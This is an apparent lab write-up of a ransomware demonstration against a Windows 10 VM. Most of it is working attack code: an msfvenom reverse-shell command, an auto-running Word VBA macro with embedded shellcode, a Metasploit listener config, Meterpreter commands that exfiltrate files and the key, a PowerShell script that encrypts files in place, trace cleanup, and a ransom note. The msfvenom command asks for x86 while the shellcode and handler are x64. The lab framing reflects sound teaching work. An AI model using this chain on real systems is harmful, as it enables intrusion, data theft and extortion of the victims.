# Ransomware Attack Demo: Basic Spearphishing and Exfiltration
This document outlines the setup and execution of a demonstration showcasing a rudimentary example of a **Ransomware Attack**.

<br/>

## Attack Description
In the scenario presented below, the adversary will inject a meticulously crafted  **Word document** with a **VBA Script** as an obfuscated payload. Subsequently, the adversary will dispatch this document to the victim via a tailored and customized email message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
It is presupposed that the victim will succumb to the **Spearphishing Attack** and download and open the document. Upon opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)), enabling the adversary to establish a **reverse shell** on the victim’s platform and remotely control it.<br/>
The attacker will then **exfiltrate** the victim’s files through the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them to **compromise** their **integrity** and demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).

<br/>

## Threat Model
The necessary **Threat Model** for this attack entails the adversary possessing the following capabilities:
* knowledge of the victim’s email address;
* luring the victim to open the Spearphishing Attachment;
* establishing a TCP connection with the victim’s machine;
* acquiring sufficient privileges on the victim’s system to execute exfiltration and encryption commands.

<br/>

## Setup
To execute the attack described above, I utilized two Virtual Machines (referenced as VMs in the following):
1. the **attacker** is associated with a **Kali Linux VM**, with an IPv4 Address of `192.168.56.102`;
2. the **victim** runs a **Windows 10 VM**, with an IPv4 Address of `192.168.56.101`.

Both VMs have their network adapter configured as "Attached to: **Host-only Adapter**" to enable only intra-network communication.

<br/>

## Preliminaries
To create a Word document containing a malicious VBA script, I employed `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack); specifically, I executed the following command on the Kali VM:
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
```
This command generates a VBA script that attempts to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To enhance its effectiveness, I modified the script to launch a thread to manage this connection:
```vb
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
#EndIf

Private Sub Document_Open()
    On Error Resume Next
    Dim myBytes As Variant
    Dim myThread As Long
    
    #If VBA7 Then
        Dim myAlloc As LongPtr
        Dim result As LongPtr
    #Else
        Dim myAlloc As Long
        Dim result As Long
    #EndIf

    myBytes = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139, _
                    82,24,72,139,82,32,72,15,183,74,74,77,49,201,72,139,114,80,72,49,192,172,60,97,124,2,44, _
                    32,65,193,201,13,65,1,193,226,237,82,72,139,82,32,65,81,139,66,60,72,1,208,102,129,120, _
                    24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,80,68, _
                    139,64,32,73,1,208,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,172,65, _
                    193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
                    208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90, _
                    65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255, _
                    93,73,190,119,115,50,95,51,50,0,0,65,86,73,137,230,72,129,236,160,1,0,0,73,137,229,73, _
                    188,2,0,17,92,192,168,56,102,65,84,73,137,228,76,137,241,65,186,76,119,38,7,255,213,76, _
                    137,234,104,1,1,0,0,89,65,186,41,128,107,0,255,213,106,10,65,94,80,80,77,49,201,77,49, _
                    192,72,255,192,72,137,194,72,255,192,72,137,193,65,186,234,15,223,224,255,213,72,137, _
                    199,106,16,65,88,76,137,226,72,137,249,65,186,153,165,116,97,255,213,133,192,116,10, _
                    73,255,206,117,229,232,147,0,0,0,72,131,236,16,72,137,226,77,49,201,106,4,65,88,72, _
                    137,249,65,186,2,217,200,95,255,213,131,248,0,126,85,72,131,196,32,94,137,246,106,64, _
                    65,89,104,0,16,0,0,65,88,72,137,242,72,49,201,65,186,88,164,83,229,255,213,72,137,195, _
                    73,137,199,77,49,201,73,137,240,72,137,218,72,137,249,65,186,2,217,200,95,255,213,131, _
                    248,0,125,40,88,65,87,89,104,0,64,0,0,65,88,106,0,90,65,186,11,47,15,48,255,213,87,89, _
                    65,186,117,110,77,97,255,213,73,255,206,233,60,255,255,255,72,1,195,72,41,198,72,133,246, _ 
                    117,180,65,255,231,88,106,0,89,73,199,194,240,181,162,86,255,213)

    myAlloc = VirtualAlloc(0, UBound(myBytes), &H1000, &H40)
    
    For i = LBound(myBytes) To UBound(myBytes)
        result = RtlMoveMemory(myAlloc + i, myBytes(i), 1)
    Next i
    
    result = CreateThread(0, 0, myAlloc, 0, 0, myThread)
End Sub

Private Sub AutoOpen()
    Document_Open
End Sub

Private Sub Workbook_Open()
    Document_Open
End Sub
```
To inject this payload into a Word document, I used `macro_pack` by executing the following command:
```
macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
```
![Photo of Mountain](images/mountain.jpg)
> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features. Therefore, I ran the `macro_pack` command on an appropriate Windows VM (not previously mentioned for clarity).

<br/>

## Spearphishing
Once the adversary generates the `malicious.docm` document, it must be injected into the victim’s environment. I attempted to execute a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com). However, compatibility issues were encountered, as reported [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
Consequently, I postulated that the adversary successfully acquired **Valid Credentials** for one **Domain Account** of the `units.it` domain (an additional Threat Model), to enable the transmission of the requisite Spearphishing Attachment to the victim.

![Photo of Mountain](images/mountain.jpg)

<br/>

## Initial Access & Execution
To establish a **reverse shell** at the victim’s side connected to a remote shell client at the adversary’s side, the attacker must launch a **listener** prior to the opening of the `malicious.docm` document.<br/>
To accomplish this, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
set AutoRunScript post/windows/manage/migrate NAME=explorer.exe KILL=false
set SessionCommunicationTimeout 300
set EnableUnicodeEncoding true
set HandlerSSLCert /path/to/cert.pem
set StageVerificationCode random
exploit -j
```
Then the listener is launched using the command:
```
msfconsole -q -r handler.rc
```
Upon the victim’s opening of the `malicious.docm` document, the VBA script will attempt to establish a TCP connection to the adversary-controlled listener by continuously migrating among processes running on the victim’s machine or spawning new ones until a successful connection is achieved.

![Photo of Mountain](images/mountain.jpg)

<br/>

## Exfiltration
From the remote shell client, the adversary can now navigate the victim’s File System. Depending on the **privilege level** and **access rights** the adversary is capable of acquiring on the victim's environment, the attacker may not be able to access all resources. I assumed that critical resources were located within the `C:\Users\enrico\Desktop\Very_Important_Stuff\` directory, so the adversary could exfiltrate them by executing the following command:
```
download -r C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\ /home/kali/Desktop/Exfiltrated
```

![Photo of Mountain](images/mountain.jpg)

<br/>

## Impact
To compromise the integrity of the exfiltrated files, rendering them unusable to the victim, I have developed a Powershell script:
```powershell
# Generate a random AES encryption key and IV
$key = New-Object byte[] 32
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)

$iv = New-Object byte[] 16
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)

# Save the encryption key and IV to a file
$keyFile = "C:\Users\enrico\Documents\encryption_key.bin"
[System.IO.File]::WriteAllBytes($keyFile, $key)

# Function to encrypt one file
function Encrypt-File {
    param (
        [string]$filePath
    )
    try {
        # Read file content
        $fileContent = Get-Content -Path $filePath -Raw -ErrorAction Stop

        # Convert content to bytes
        $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)

        # Create AES encryption object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Encrypt file content
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

        # Overwrite the original file with encrypted content
        [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)

        Write-Host "Encrypted: $filePath"
    } catch {
        Write-Host "Failed to encrypt: $filePath - $_"
    }
}

# Target folder for encryption
$targetFolder = "C:\Users\enrico\Desktop\Very_Important_Stuff"

# Encrypt all files in the target folder
Get-ChildItem -Path $targetFolder -File -Recurse | ForEach-Object {
    Encrypt-File -filePath $_.FullName
}

Write-Host "Encryption complete. Files are now unreadable."
```
This script must be uploaded to an adversary-selected location on the victim’s platform:
```
upload /home/kali/Desktop/encrypt.ps1 C:\\Users\\enrico\\Documents\\encrypt.ps1
```
and subsequently executed:
```
execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Users\\enrico\\Documents\\encrypt.ps1"
```
To minimise the likelihood of leaving traces, I also exfiltrate the encryption/decryption key:
```
download C:\\Users\\enrico\\Documents\\encryption_key.bin /home/kali/Desktop/Exfiltrated
```
and remove both the key and the Powershell script from the victim’s machine:
```
rm C:\\Users\\enrico\\Documents\\encryption_key.bin
rm C:\\Users\\enrico\\Documents\\encrypt.ps1
```
To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file within the disrupted folder:
```
execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\README.txt"
```

![Photo of Mountain](images/mountain.jpg)

<br/>

## Credits
- I have drawn inspiration for this attack from the [Lockard Security](https://www.youtube.com/@lockardsecurity/videos) Youtube channel.
- I have followed [this](https://www.youtube.com/watch?v=UTd8mL2itUo) tutorial for installing Microsoft Word LTSC 2021 on the Windows 10 VM.
- The setup of the custom SMTP Server was based on a [SMTP Server setup guide](https://mailtrap.io/blog/setup-smtp-server/) of the [Mailtrap](https://mailtrap.io/blog/) blog.
- I have learnt how to write en encryption script in Powershell essentially by following the [PoshCodex](https://www.poshcodex.co.uk/) blog, particularly the "Powershell: Working with AES encryption" blog post, which consists of [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/).